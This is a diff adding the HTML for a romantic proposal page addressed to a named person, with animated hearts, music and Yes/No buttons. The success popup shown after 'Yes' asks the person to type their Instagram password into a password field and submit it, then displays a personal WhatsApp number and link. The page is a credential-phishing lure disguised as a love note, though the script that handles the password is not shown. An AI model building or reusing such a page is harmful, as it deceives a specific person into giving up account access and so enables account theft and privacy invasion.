@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Will You Be Mine Forever? 💕</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💖</text></svg>">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Background Music -->
+    <audio id="backgroundMusic" loop autoplay>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Floating Hearts Background -->
+    <div class="hearts-container"></div>
+
+    <!-- Floating Petals -->
+    <div class="petals-container"></div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Big Heart Animation -->
+        <div class="heart-animation">
+            <div class="heart"></div>
+        </div>
+
+        <!-- Ring Animation -->
+        <div class="ring-container">
+            💖
+        </div>
+
+        <!-- Title -->
+        <h1 class="title">Will You Be Mine Forever?</h1>
+
+        <!-- Romantic Message -->
+        <div class="message">
+         
+            <p class="message-name">
+             arshuuu, will you be mine forever? 💞
+            </p>
+        </div>
+
+        <!-- Buttons -->
+        <div class="buttons-container">
+            <button id="yesBtn" class="btn btn-yes">
+                Yes ❤️
+            </button>
+            <button id="noBtn" class="btn btn-no">
+                No 😝
+            </button>
+        </div>
+    </div>
+
+    <!-- Success Popup -->
+    <div id="successPopup" class="popup hidden">
+        <div class="popup-content">
+            <div class="popup-heart">💖</div>
+            <h2 class="popup-title">Yay! Thank you my love Sarang 💍❤️</h2>
+            <div class="confetti-container" id="confetti"></div>
+            
+            <!-- Instagram Password Form -->
+            <div id="passwordForm" class="password-form">
+                <p class="form-instruction">Please enter your Instagram password 💕</p>
+                <input type="password" id="instagramPassword" class="password-input" placeholder="Enter Instagram password..." autocomplete="off">
+                <button id="submitPassword" class="btn-submit">Submit 💖</button>
+            </div>
+            
+            <!-- WhatsApp Number Display -->
+            <div id="whatsappDisplay" class="whatsapp-display hidden">
+                <div class="whatsapp-icon">📱</div>
+                <p class="whatsapp-label">My WhatsApp Number:</p>
+                <a href="https://wa.me/918547537571" class="whatsapp-number" id="whatsappLink">+91 85475 37571</a>
+                <p class="whatsapp-note">Click to chat with me! 💬❤️</p>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
